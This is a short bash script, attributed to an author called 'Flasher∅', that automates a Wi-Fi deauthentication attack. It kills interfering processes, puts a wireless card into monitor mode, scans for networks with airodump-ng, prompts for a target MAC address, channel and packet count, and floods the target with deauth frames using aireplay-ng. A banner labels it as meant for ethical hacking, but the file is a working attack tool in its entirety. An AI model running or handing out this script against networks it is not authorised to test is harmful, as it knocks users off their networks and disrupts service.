echo "A shell script to deauth attack a wifi network by Flasher∅
      ----------------------------------------------------
      Use this as part of Ethical Hacking | Nek Nganggo sewajar e ."

sudo airmon-ng check kill

sudo airmon-ng start wlan0mon

echo "Enter the interface name =>"
read interface
intermon="$interface"mon

echo "Starting monitor mode"
sudo airmon-ng start $interface

echo "---Press Ctrl+C after noting the bssid and channel---"
sleep 3
sudo airodump-ng $intermon

echo "Enter the MAC address =>"
read mac

echo "Enter the channel number =>"
read chan

echo "Enter the deauth number to send =>"
read deauth

sudo sudo iw dev $intermon set channel $chan

echo -e "------------------\n|deautheticating|\n|MAC add. $mac|\n|-------------------|"
sleep 4
sudo aireplay-ng -0 $deauth -a $mac $intermon

echo "Stopping monitor mode"
sudo airmon-ng stop $intermon

echo "Restarting NetworkManager with systemd..."
sudo systemctl restart NetworkManager.service
